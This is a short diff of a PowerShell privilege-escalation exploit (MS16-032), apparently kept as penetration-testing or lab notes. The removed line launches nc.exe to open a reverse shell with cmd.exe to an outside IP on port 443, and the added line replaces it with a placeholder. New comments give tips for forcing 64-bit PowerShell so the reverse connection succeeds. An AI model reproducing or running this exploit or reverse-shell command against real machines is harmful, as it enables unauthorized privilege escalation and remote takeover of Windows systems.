@@ -330,11 +330,15 @@ function Invoke-MS16-032 {
 		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
 		$CallResult = [Advapi32]::CreateProcessWithLogonW(
 			"user", "domain", "pass",
-			0x00000002, "C:\Windows\System32\cmd.exe", "/c C:\HFS\nc.exe 192.168.119.218 443 -e cmd.exe",
+			0x00000002, "C:\Windows\System32\cmd.exe", "/c <rev shell cmd>",
 			0x00000004, $null, $GetCurrentPath,
 			[ref]$StartupInfo, [ref]$ProcessInfo)
 		
 		#---
+		# REMEMBER: if standards execution fails (powershell.exe -C), try: 
+			# C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
+				#will ensure the script is ran in 64 bit if rev connection environment is 32 bit
+				
 		# Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.
 		#---
 		# Missing this check used to cause the exploit to fail sometimes.
